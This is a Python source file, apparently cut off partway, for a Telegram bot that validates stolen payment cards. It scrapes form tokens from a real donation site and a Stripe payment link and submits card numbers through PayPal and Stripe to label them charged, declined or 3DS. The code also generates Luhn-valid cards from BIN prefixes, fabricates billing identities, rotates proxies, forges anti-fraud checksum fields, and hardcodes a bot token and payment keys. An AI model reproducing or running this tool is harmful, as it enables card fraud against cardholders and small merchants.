import asyncio
import logging
import random
import re
import string
import urllib.parse
import uuid
import json
import os
import time
import platform
import sys
import base64
from datetime import datetime
from io import BytesIO
from typing import Dict, List, Optional, Tuple, Any
from collections import OrderedDict
import string as string_module

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# محاولة استيراد user_agent
try:
    from user_agent import generate_user_agent
except:
    # إذا لم تكن موجودة، استخدم دالة بديلة
    def generate_user_agent():
        agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        ]
        return random.choice(agents)

# ============================================================
# CONFIGURATION
# ============================================================

BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = 6936293942
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

DEFAULT_BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
DEFAULT_PAYMENT_LINK_ID = DEFAULT_BUY_URL.rstrip("/").split("/")[-1]

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
)

# ============================================================
# FONT SYSTEM
# ============================================================

FONT_MAP = {
    'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲',
    'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
    'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼',
    'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
    'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆',
    'z': '𝘇',
    'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘',
    'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
    'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢',
    'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
    'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬',
    'Z': '𝗭',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
}

def fb(text):
    return "".join(FONT_MAP.get(ch, ch) for ch in text)

# ============================================================
# PAYPAL JAZZ GATEWAY
# ============================================================

class PayPalJazzGateway:
    def __init__(self):
        self.session = requests.Session()
        
    def generate_data(self):
        fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
        lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
        f = random.choice(fnames)
        l = random.choice(lnames)
        num = random.randint(10, 999)
        email = f"{f}.{l}{num}@{random.choice(domains)}"
        name = f"{f.capitalize()} {l.capitalize()}"
        add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
        city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
        zip_code = str(random.randint(10000, 99999))
        return email, name, add, city, zip_code

    def check_card(self, card_number, exp_month, exp_year, cvv):
        """
        فحص بطاقة عبر بوابة PayPal Jazz
        returns: (success, message, details)
        """
        try:
            email, name, add, city, zip_code = self.generate_data()
            r = self.session
            u = generate_user_agent()
            
            # الخطوة 1: جلب الصفحة واستخراج التوكينات
            resp = r.get('https://jazzonthetube.com/video/support-jazz-on-the-tube/', headers={'User-Agent': u})
            html = resp.text
            
            v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
            v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
            x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
            x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)
            
            x24 = base64.b64decode(x23).decode()
            x25 = json.loads(x24)
            x26 = x25['paypal']['accessToken']
            
            # الخطوة 2: إرسال بيانات الدفع
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://jazzonthetube.com',
                'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': u,
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
            }

            data = {
                'give-honeypot': '',
                'give-form-id-prefix': v1,
                'give-form-id': v2,
                'give-form-title': 'One Time Donation',
                'give-current-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
                'give-form-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
                'give-form-minimum': '5.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': x1,
                'give-price-id': 'custom',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                'give_recurring_donation_details': '{"is_recurring":false}',
                'give-amount': '5.00',
                'give-radio-donation-level': 'custom',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': name.split()[0] if ' ' in name else name,
                'give_last': name.split()[1] if ' ' in name else name,
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': email,
                'card_name': name,
                'card_exp_month': '',
                'card_exp_year': '',
                'billing_country': 'US',
                'card_address': add,
                'card_address_2': '',
                'card_city': city,
                'card_state': 'NY',
                'card_zip': zip_code,
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }

            response = r.post('https://jazzonthetube.com/video/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

            # الخطوة 3: إنشاء الطلب
            params = {'action': 'give_paypal_commerce_create_order'}
            files = {
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, v1),
                'give-form-id': (None, v2),
                'give-form-title': (None, 'One Time Donation'),
                'give-current-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
                'give-form-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
                'give-form-minimum': (None, '5.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, x1),
                'give-price-id': (None, 'custom'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                'give_recurring_donation_details': (None, '{"is_recurring":false}'),
                'give-amount': (None, '5.00'),
                'give-radio-donation-level': (None, 'custom'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, name.split()[0] if ' ' in name else name),
                'give_last': (None, name.split()[1] if ' ' in name else name),
                'give_company_option': (None, 'no'),
                'give_company_name': (None, ''),
                'give_email': (None, email),
                'card_name': (None, name),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'billing_country': (None, 'US'),
                'card_address': (None, add),
                'card_address_2': (None, ''),
                'card_city': (None, city),
                'card_state': (None, 'NY'),
                'card_zip': (None, zip_code),
                'give-gateway': (None, 'paypal-commerce'),
            }

            response = r.post(
                'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                files=files,
            )
            
            try:
                xdata = response.json()['data']['id']
            except:
                return False, "Failed to create order", {}

            # الخطوة 4: تأكيد الدفع مع البطاقة
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
                'authorization': f'Bearer {x26}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': u,
            }

            json_data = {
                'payment_source': {
                    'card': {
                        'number': card_number,
                        'expiry': f"{exp_year}-{exp_month}",
                        'security_code': cvv,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }

            response = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )

            result = response.json()
            
            if response.status_code == 200 and result.get('status') in ['COMPLETED', 'APPROVED']:
                return True, "Payment Approved", result
            elif 'error' in result:
                error_msg = result.get('error', {}).get('message', 'Payment Declined')
                return False, error_msg, result
            else:
                return False, "Payment Declined", result

        except Exception as e:
            return False, f"Error: {str(e)}", {}

# ============================================================
# BIN DATABASE
# ============================================================

class BinDatabase:
    def __init__(self, db_file="bin_cache.json"):
        self.db_file = db_file
        self.bins = {}
        self.request_count = 0
        self.last_request_time = 0
        self.load_database()
        
    def load_database(self):
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    self.bins = json.load(f)
            except:
                self.bins = {}
        else:
            self.bins = {
                "434527": {"scheme": "visa", "type": "debit", "brand": "Visa Classic", 
                          "bank": "Cooperativa Nacional De Educadores", "country": "Costa Rica", "emoji": "🇨🇷"},
                "515894": {"scheme": "mastercard", "type": "credit", "brand": "Gold",
                          "bank": "Banco Cooperativo Sicoob", "country": "Brazil", "emoji": "🇧🇷"},
                "490638": {"scheme": "visa", "type": "credit", "brand": "Visa Gold",
                          "bank": "Bawag P.S.K.", "country": "Germany", "emoji": "🇩🇪"},
            }
            self.save_database()
            
    def save_database(self):
        try:
            with open(self.db_file, 'w', encoding='utf-8') as f:
                json.dump(self.bins, f, indent=4, ensure_ascii=False)
        except:
            pass
            
    def lookup(self, bin_prefix: str) -> Optional[Dict]:
        key = bin_prefix[:6]
        if key in self.bins:
            return self.bins[key]
        return None
        
    def add_bin(self, bin_prefix: str, info: Dict):
        key = bin_prefix[:6]
        if key not in self.bins:
            self.bins[key] = info
            self.save_database()
            
    def can_request_api(self) -> bool:
        now = time.time()
        if self.request_count >= 5:
            if now - self.last_request_time < 10:
                return False
            else:
                self.request_count = 0
        return True
        
    def record_api_request(self):
        self.request_count += 1
        self.last_request_time = time.time()

bin_db = BinDatabase()

def bin_lookup_with_cache(bin_num: str) -> Dict:
    cached = bin_db.lookup(bin_num[:6])
    if cached:
        return cached
        
    if not bin_db.can_request_api():
        time.sleep(2)
        
    try:
        time.sleep(random.uniform(0.3, 0.8))
        response = requests.get(
            f"https://lookup.binlist.net/{bin_num[:6]}", 
            headers={"Accept-Version": "3", "User-Agent": USER_AGENT},
            timeout=10
        )
        bin_db.record_api_request()
        
        if response.status_code == 200:
            data = response.json()
            info = {
                "scheme": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "emoji": data.get("country", {}).get("emoji", "")
            }
            bin_db.add_bin(bin_num[:6], info)
            return info
    except:
        pass
        
    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", 
           "country": "Unknown", "bank": "Unknown", "emoji": ""}

# ============================================================
# USER DATA STORAGE
# ============================================================

user_db = {}
banned_users = set()
generated_codes = {}
stop_check = False

def get_user(user_id):
    if user_id not in user_db:
        user_db[user_id] = {
            "checks": 0, "charged": 0, "declined": 0, "_3ds": 0,
            "history": [], "registered": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "plan": "Free", "points": 0, "ip": None,
        }
    return user_db[user_id]

def stop_all_checks():
    global stop_check
    stop_check = True

def reset_stop():
    global stop_check
    stop_check = False

def is_stopped():
    return stop_check

def generate_redeem_code(plan: str, days: int) -> str:
    code = "".join(random.choices(string_module.ascii_uppercase + string_module.digits, k=16))
    code = f"{code[:4]}-{code[4:8]}-{code[8:12]}-{code[12:]}"
    generated_codes[code] = {
        "plan": plan,
        "days": days,
        "created_at": time.time(),
        "expires_at": time.time() + (days * 24 * 3600),
        "used_by": None
    }
    return code

# ============================================================
# GATEWAY MANAGEMENT
# ============================================================

gateways = {
    "stripe": {
        "name": "Stripe", "url": DEFAULT_BUY_URL,
        "link_id": DEFAULT_PAYMENT_LINK_ID, "active": True,
    },
    "paypal_jazz": {
        "name": "PayPal Jazz",
        "url": "https://jazzonthetube.com",
        "active": True,
    }
}

def add_gateway(name, url):
    link_id = url.rstrip("/").split("/")[-1]
    gateways[name.lower()] = {
        "name": name, "url": url,
        "link_id": link_id, "active": True,
    }

def remove_gateway(name):
    name = name.lower()
    if name in gateways and name not in ["stripe", "paypal_jazz"]:
        del gateways[name]
        return True
    return False

# ============================================================
# PROXY MANAGEMENT
# ============================================================

proxies = []

def add_proxy(proxy_str):
    proxies.append(proxy_str)

def remove_proxy(index):
    if 0 <= index < len(proxies):
        return proxies.pop(index)
    return None

def get_proxy():
    if proxies:
        proxy = random.choice(proxies)
        return {"http": proxy, "https": proxy}
    return None

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# COLORED BUTTONS
# ============================================================

def send_colored_buttons(chat_id, text, buttons, parse_mode="HTML"):
    keyboard = {"inline_keyboard": []}
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback"]}
            if "style" in btn:
                btn_dict["style"] = btn["style"]
            keyboard_row.append(btn_dict)
        keyboard["inline_keyboard"].append(keyboard_row)

    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": keyboard
    }
    try:
        resp = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        logger.error(f"Failed to send colored buttons: {e}")
        return None

def b(text, callback, style="primary"):
    return {"text": text, "callback": callback, "style": style}

def b_red(text, callback):
    return {"text": text, "callback": callback, "style": "danger"}

def b_green(text, callback):
    return {"text": text, "callback": callback, "style": "success"}

def b_blue(text, callback):
    return {"text": text, "callback": callback, "style": "primary"}

# ============================================================
# UI BUILDERS
# ============================================================

def build_main_menu(user_id):
    menu = [
        [b_blue(fb("Tools"), "tools")],
        [b_blue(fb("Profile"), "profile")],
        [b_blue(fb("Settings"), "settings")],
        [b_blue(fb("About"), "about")],
    ]
    
    if str(user_id) == str(ADMIN_ID):
        menu.append([b_red("<code>Admin Panel</code>", "admin_panel")])
    
    return menu

def build_tools_menu():
    return [
        [b_green(fb("Single Check"), "tool_chk")],
        [b_green(fb("Mass Check"), "tool_mass")],
        [b_green(fb("BIN Lookup"), "tool_bin")],
        [b_green(fb("Generator"), "tool_gen")],
        [b_green(fb("PayPal Jazz"), "tool_pp")],
        [b_green(fb("PayPal Mass"), "tool_px")],
        [b_blue(fb("Back"), "menu")],
    ]

def build_settings_menu():
    return [
        [b_blue(fb("Shopify"), "gw_shopify")],
        [b_blue(fb("3DS Lookup"), "gw_3ds")],
        [b_blue(fb("Site Management"), "gw_site")],
        [b_blue(fb("Proxy Management"), "gw_proxy")],
        [b_blue(fb("Other"), "gw_other")],
        [b_blue(fb("Back"), "menu")],
    ]

# ============================================================
# CARD ENGINE (Stripe)
# ============================================================

class CardEngine:
    def _rand_id(self, k=32):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

    def gen_email(self):
        domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
        return f"user{''.join(random.choices(string.digits, k=8))}@{random.choice(domains)}"

    def parse(self, line):
        line = (line or "").strip().replace(" ", "")
        if not line: return None
        parts = line.split("|")
        if len(parts) < 4: return None
        number = parts[0].strip().replace(" ", "")
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 4: year = year[-2:]
        cvc = parts[3].strip()
        name = parts[4].strip() if len(parts) > 4 else "Card Holder"
        if not number or not month or not year or not cvc: return None
        return {"number": number, "cvc": cvc, "exp_month": month,
                "exp_year": year, "name": name or "Card Holder", "email": self.gen_email()}

    def check(self, card, gateway="stripe"):
        if gateway == "paypal_jazz":
            return self.check_paypal_jazz(card)
        
        card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
        gw = gateways.get(gateway, gateways["stripe"])
        buy_url, pl_id = gw["url"], gw["link_id"]
        session = requests.Session()
        proxy = get_proxy()
        if proxy: 
            session.proxies.update(proxy)

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1", "user-agent": USER_AGENT,
        }
        resp = session.get(buy_url, headers=headers)
        html = resp.text
        pk_live = None
        m = re.search(r"pk_live_[A-Za-z0-9]+", html)
        if m: pk_live = m.group(0)
        cs_id = None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html)
        if m: cs_id = m.group(0)

        merchant_ui_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        pl_form = {"eid": "NA", "browser_locale": "vi", "browser_timezone": "Asia/Saigon",
                   "referrer_origin": "https://karibuwomenhome.com.au"}
        pl_resp = session.post(f"https://merchant-ui-api.stripe.com/payment-links/{pl_id}",
                               headers=merchant_ui_headers, data=urllib.parse.urlencode(pl_form))

        checkout_session_id = cs_id
        pl_data, pl_expected_amount, pl_config_id, pl_currency = {}, None, None, "aud"
        if pl_resp.ok:
            try:
                pl_data = pl_resp.json()
                checkout_session_id = pl_data.get("session_id") or checkout_session_id
                pl_config_id = pl_data.get("config_id")
                pl_currency = pl_data.get("currency") or "aud"
                lig = pl_data.get("line_item_group") or {}
                pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if pl_expected_amount is not None: pl_expected_amount = int(pl_expected_amount)
            except: pass

        if not pk_live: 
            pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
        if not checkout_session_id: 
            checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"

        muid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        stripe_js_id = str(uuid.uuid4())
        currency = pl_currency

        api_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com", "priority": "u=1, i", "referer": "https://js.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        es_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live, "elements_init_source": "payment_link",
            "hosted_surface": "checkout", "referrer_host": "buy.stripe.com",
            "stripe_js_id": stripe_js_id, "locale": "vi", "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        response_es = session.get("https://api.stripe.com/v1/elements/sessions", params=es_params, headers=api_headers)
        es_data = response_es.json()
        expected_amount_cents = pl_expected_amount
        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None: expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}
        form_pm = {
            "type": "card", "card[number]": card["number"], "card[cvc]": card["cvc"],
            "card[exp_month]": card["exp_month"], "card[exp_year]": card["exp_year"],
            "billing_details[name]": card["name"], "billing_details[email]": card["email"],
            "billing_details[address][country]": "US", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        response_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm))
        pm_resp = response_pm.json()
        if pm_resp.get("error"): 
            return card_str, False, f"Error: {pm_resp['error'].get('message')}", False
        pm_id = pm_resp.get("id")
        if not pm_id: 
            return card_str, False, "Failed to create PaymentMethod", False

        init_checksum = self._rand_id(32)
        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
        pxvid = str(uuid.uuid4())
        rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

        confirm_form = {
            "eid": "NA", "payment_method": pm_id, "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "version": "148043f9d7", "init_checksum": init_checksum,
            "js_checksum": js_checksum, "pxvid": pxvid, "passive_captcha_token": "",
            "passive_captcha_ekey": pl_data.get("site_key", ""), "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        confirm_resp = session.post(f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                                    headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""))
        data = confirm_resp.json()

        if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return card_str, False, "3DS Required - Possible OTP", False
        err = data.get("error") or {}
        if err:
            message = err.get("message", "Your card was declined.")
            if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                return card_str, True, "CHARGED", True
            return card_str, False, message, False
        if data.get("status") in ("succeeded", "complete"): 
            return card_str, True, "CHARGED", True
        return card_str, False, "Unknown response", False

    def check_paypal_jazz(self, card):
        """فحص عبر PayPal Jazz Gateway"""
        gateway = PayPalJazzGateway()
        success, message, details = gateway.check_card(
            card['number'],
            card['exp_month'],
            card['exp_year'],
            card['cvc']
        )
        card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
        return card_str, success, message, success

engine = CardEngine()

# ============================================================
# CARD GENERATOR
# ============================================================

def luhn_check(num):
    digits = [int(d) for d in num]
    odd, even = digits[-1::-2], digits[-2::-2]
    total = sum(odd)
    for d in even:
        d *= 2
        if d > 9: d -= 9
        total += d
    return total % 10 == 0

def gen_card_from_bin(bin_prefix, count=10):
    results = []
    for _ in range(count):
        card = bin_prefix
        while len(card) < 15: 
            card += str(random.randint(0, 9))
        for check in range(10):
            test = card + str(check)
            if luhn_check(test): 
                results.append(test)
                break
    return results

# ============================================================
# COMMANDS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned from using this bot."))
        return
    
    user = update.effective_user
    get_user(user.id)
    username = f"@{user.username}" if user.username else "N/A"
    plan = get_user(user.id)["plan"]
    if user.id == ADMIN_ID:
        plan = "Admin"

    text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""

    menu = build_main_menu(user_id)
    send_colored_buttons(update.effective_chat.id, text, menu)


async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    udata = get_user(user_id)
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/chk cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return
    
    line = " ".join(context.args)
    card = engine.parse(line)
    if not card:
        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text(f"{fb('Checking...')}\n<code>{line}</code>", parse_mode="HTML")
    
    try:
        card_str, success, msg, charged = engine.check(card)
        udata["checks"] += 1

        bin_info = bin_lookup_with_cache(card['number'])
        bin_scheme = bin_info.get('scheme', 'Unknown')
        bin_type = bin_info.get('type', 'Unknown')
        bin_brand = bin_info.get('brand', 'Unknown')
        bin_country = bin_info.get('country', 'Unknown')
        bin_bank = bin_info.get('bank', 'Unknown')
        bin_emoji = bin_info.get('emoji', '')

        if success:
            udata["charged"] += 1
            status_text = "CHARGED!"
            status_icon = "[+]"
            response_text = "APPROVED"
        elif "3DS" in msg:
            udata["_3ds"] += 1
            status_text = "3DS Required"
            status_icon = "[~]"
            response_text = "3DS OTP"
        else:
            udata["declined"] += 1
            status_text = "DECLINED"
            status_icon = "[-]"
            response_text = msg

        output = f"""{status_icon} Gateway: Stripe Payment Link
-------------------------------
{status_icon} Card: <code>{card_str}</code>
{status_icon} Status: {status_text}
{status_icon} Response: {response_text} [{bin_scheme}] [{card['number'][-4:]}]
-------------------------------
{status_icon} Bin: {bin_scheme} - {bin_type} - {bin_brand}
{status_icon} Bank: {bin_bank}
{status_icon} Country: {bin_country} {bin_emoji}
-------------------------------
{status_icon} Time: {datetime.now().strftime('%H:%M:%S')}
{status_icon} By: yacinedev Checker
-------------------------------"""

        await status_msg.edit_text(output, parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"{fb('Error')}: <code>{str(e)}</code>", parse_mode="HTML")


async def cmd_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص بطاقة عبر PayPal Jazz - /pp cc|mm|yyyy|cvv"""
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    udata = get_user(user_id)
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/pp cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return
    
    line = " ".join(context.args)
    card = engine.parse(line)
    if not card:
        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text(f"{fb('Checking via PayPal Jazz...')}\n<code>{line}</code>", parse_mode="HTML")
    
    try:
        card_str, success, msg, charged = engine.check(card, gateway="paypal_jazz")
        udata["checks"] += 1

